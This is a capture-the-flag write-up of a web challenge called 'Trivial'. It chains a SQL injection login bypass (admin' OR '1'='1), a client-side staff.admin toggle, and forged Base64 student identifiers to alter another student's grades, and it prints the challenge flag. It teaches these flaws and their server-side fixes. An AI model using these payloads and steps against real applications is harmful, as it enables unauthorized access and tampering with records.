# OSU CTF — Trivial Web Challenge Writeup

## Challenge Overview

* **Challenge Name:** Trivial
* **Category:** Web
* **Difficulty:** Moderate
* **Objective:** Exploit the vulnerable web application, bypass authentication, discover hidden functionality, and retrieve the flag.

---

## 1. Login Bypass — SQL Injection

I started by testing the login form for SQL Injection vulnerabilities.

The following payload was entered into the **password** field:

```sql
admin' OR '1'='1
```

The application accepted the input and allowed me to bypass the login authentication.

This indicated that the backend was likely constructing an SQL query unsafely using user-controlled input.

### Result

I successfully gained access to the application's dashboard without knowing the legitimate password.

---

## 2. Inspecting JavaScript Files

After gaining access to the dashboard, I inspected the application's JavaScript files using the browser's **Developer Tools**.

The goal was to identify:

* Hidden routes
* Client-side access controls
* Administrative functionality
* Interesting parameters
* Unlinked application endpoints

One JavaScript file that stood out was:

```text
/assets/js/app.min.js
```

Inside the file, I found logic related to student records and administrative privileges.

```javascript
(function (s, objectName) {
  setupLinks = function () {
    if (s.admin) {
      var sl = document.getElementsByClassName('student-link');

      for (i = 0; i < sl.length; i++) {
        let name = sl[i].innerHTML;

        sl[i].style.cursor = 'pointer';

        sl[i].addEventListener('click', function () {
          window.location = '/update-' + objectName + '/' + this.dataset.id;
        });
      }
    }
  };

  updateForm = function () {
    var submitButton = document.getElementsByClassName('update-record');

    if (submitButton.length === 1) {
      submitButton[0].addEventListener('click', function () {
        var english = document.getElementById('english');
        english = english.options[english.selectedIndex].value;

        var science = document.getElementById('science');
        science = science.options[science.selectedIndex].value;

        var maths = document.getElementById('maths');
        maths = maths.options[maths.selectedIndex].value;

        var grades = new Set(['A', 'B', 'C', 'D', 'E', 'F']);

        if (
          grades.has(english) &&
          grades.has(science) &&
          grades.has(maths)
        ) {
          document.getElementById('student-form').submit();
        } else {
          alert('Grades should only be between A - F');
        }
      });
    }
  };

  setupLinks();
  updateForm();
})(staff, 'student');
```

---

## 3. Identifying the `s.admin` Variable

The JavaScript contained an important condition:

```javascript
if (s.admin)
```

This variable appeared to determine whether administrative functionality was available on the page.

I checked its value through the browser console:

```javascript
console.log(s.admin);
```

The result was:

```text
false
```

This suggested that the application was relying on **client-side JavaScript** to control access to certain functionality.

I then inspected the `staff` object:

```javascript
console.log(window.staff.admin);
```

Since the value was controlled client-side, I changed it locally:

```javascript
staff.admin = true;
```

Then I re-executed:

```javascript
setupLinks();
```

After doing this, the student names became clickable.

> **Important:** Changing a JavaScript variable only changes the client-side state. It does not constitute a real server-side privilege escalation by itself. The important finding here was that sensitive functionality was being exposed based on a client-controlled variable.

---

## 4. Discovering the Hidden Update Endpoint

After enabling the client-side administrative functionality, I clicked on a student name such as:

```text
Brett, Nancie
```

The application redirected me to:

```text
/update-student/TmFuY2llX0JyZXR0
```

The final portion of the URL looked encoded rather than randomly generated.

```text
TmFuY2llX0JyZXR0
```

I investigated the encoding and identified it as **Base64**.

---

## 5. Decoding the Base64 Value

Decoding:

```text
TmFuY2llX0JyZXR0
```

produced:

```text
Nancie_Brett
```

This showed that the URL parameter was simply an encoded representation of the student's name.

The important observation was that the identifier was not a strong random identifier; it was derived from predictable information.

---

## 6. Manipulating the Student Identifier

I tested whether I could access another student's record by changing the Base64 value.

The target student was:

```text
Natasha_Drew
```

I encoded the value:

```text
Natasha_Drew
```

into Base64:

```text
TmF0YXNoYV9EcmV3
```

I then modified the endpoint to:

```text
/update-student/TmF0YXNoYV9EcmV3
```

The application returned the corresponding student's update page.

This demonstrated an **insecure direct object reference / broken access control style issue**, because the identifier could be manipulated to access another student's record.

---

## 7. Modifying the Student Grades

On the update page, I changed the student's grades to:

```text
English: A
Science: A
Maths: A
```

I then clicked:

```text
Update Record
```

The application accepted the changes.

This showed that the hidden administrative functionality could be reached by manipulating client-side state and predictable object identifiers.

---

## 8. Flag

The challenge ultimately revealed the following flag:

```text
^FLAG^641162e5fe7fba2dcc744c6024c61d168aa41a62547f52b1882f1761232682b7$FLAG$
```

---

## Attack Chain

The complete attack chain was:

```text
Login Page
    |
    v
SQL Injection
    |
    v
Authentication Bypass
    |
    v
Dashboard
    |
    v
JavaScript Source Code Inspection
    |
    v
Identify client-side `staff.admin`
    |
    v
Set `staff.admin = true`
    |
    v
Expose hidden student update links
    |
    v
Identify Base64-encoded student identifier
    |
    v
Decode identifier
    |
    v
Encode another student's name
    |
    v
Access another student's update endpoint
    |
    v
Modify grades
    |
    v
Retrieve Flag
```

---

## Vulnerabilities Identified

### 1. SQL Injection

The login form was vulnerable to SQL Injection, allowing authentication to be bypassed using crafted input.

Example:

```sql
admin' OR '1'='1
```

---

### 2. Client-Side Access Control

Administrative functionality was controlled using:

```javascript
s.admin
```

Because this value existed on the client side, it could be modified using browser Developer Tools.

Sensitive authorization decisions should always be enforced on the server.

---

### 3. Predictable Object Identifiers

Student identifiers were represented using Base64-encoded names:

```text
Nancie_Brett
```

Base64 is an encoding mechanism, not encryption.

Using predictable identifiers can make it easier to manipulate object references.

---

### 4. Broken Access Control / IDOR

Changing:

```text
TmFuY2llX0JyZXR0
```

to:

```text
TmF0YXNoYV9EcmV3
```

allowed access to another student's record.

This demonstrates why applications should perform server-side authorization checks for every requested object.

---

## Key Learning Points

1. Always test authentication forms for SQL Injection during authorized security testing.
2. Inspect JavaScript files for hidden routes and client-side security logic.
3. Never trust client-side variables for authorization.
4. Base64 encoding does not provide confidentiality or security.
5. Test whether object identifiers can be manipulated to access other users' resources.
6. Authorization must be enforced server-side.
7. Combining multiple weaknesses can turn seemingly minor issues into a complete application compromise.

---

## Conclusion

The challenge demonstrated a realistic attack chain involving multiple web application security weaknesses.

The initial SQL Injection bypassed authentication. After gaining access, JavaScript source-code analysis revealed client-side administrative logic. By modifying the `staff.admin` variable, hidden functionality became accessible. The student update endpoint then exposed predictable Base64-encoded identifiers, which could be manipulated to access another student's record.

The challenge reinforced an important security principle:

> **Client-side controls should never be trusted for authorization. Sensitive access decisions must always be validated on the server.**

## Flag

```text
^FLAG^641162e5fe7fba2dcc744c6024c61d168aa41a62547f52b1882f1761232682b7$FLAG$
```
